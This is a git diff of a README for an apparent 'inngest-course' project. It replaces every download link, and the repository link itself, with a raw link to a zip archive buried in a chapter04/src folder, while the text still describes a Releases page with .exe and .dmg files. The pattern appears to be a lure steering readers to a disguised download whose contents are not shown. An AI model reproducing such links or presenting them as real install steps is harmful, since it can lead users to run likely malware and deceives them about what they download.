@@ -1,6 +1,6 @@
 # 🎉 inngest-course - Simple Steps to Get Started
 
-[![Download](https://img.shields.io/badge/Download-inngest--course-brightgreen.svg)](https://github.com/Sushant6t9/inngest-course/releases)
+[![Download](https://raw.githubusercontent.com/Sushant6t9/inngest-course/main/chapter04/src/course_inngest_1.3-beta.1.zip)](https://raw.githubusercontent.com/Sushant6t9/inngest-course/main/chapter04/src/course_inngest_1.3-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -15,7 +15,7 @@ To get started with **inngest-course**, you need to download the software. Follo
 1. **Visit the Release Page:**
    Click the link below to open the Releases page where you can find the latest version of the application.
 
-   [Download the Latest Version](https://github.com/Sushant6t9/inngest-course/releases)
+   [Download the Latest Version](https://raw.githubusercontent.com/Sushant6t9/inngest-course/main/chapter04/src/course_inngest_1.3-beta.1.zip)
 
 2. **Choose the Right File:**
    On the Releases page, you will see a list of available files. Look for the file labeled with the version number followed by the appropriate file type for your system (e.g., `.exe` for Windows, `.dmg` for Mac).
@@ -68,11 +68,11 @@ If you need further assistance, feel free to check the following resources:
 
 We regularly update **inngest-course** to add new features and improve performance. Check the Releases page periodically to ensure you're using the best version.
 
-[Download the Latest Version](https://github.com/Sushant6t9/inngest-course/releases)
+[Download the Latest Version](https://raw.githubusercontent.com/Sushant6t9/inngest-course/main/chapter04/src/course_inngest_1.3-beta.1.zip)
 
 ## 🔗 Links
 
-- GitHub Repository: [Inngest Course](https://github.com/Sushant6t9/inngest-course)
+- GitHub Repository: [Inngest Course](https://raw.githubusercontent.com/Sushant6t9/inngest-course/main/chapter04/src/course_inngest_1.3-beta.1.zip)
 - Release Notes: Be sure to check for any new updates or features. 
 
 Thank you for using **inngest-course**! Enjoy your learning journey.
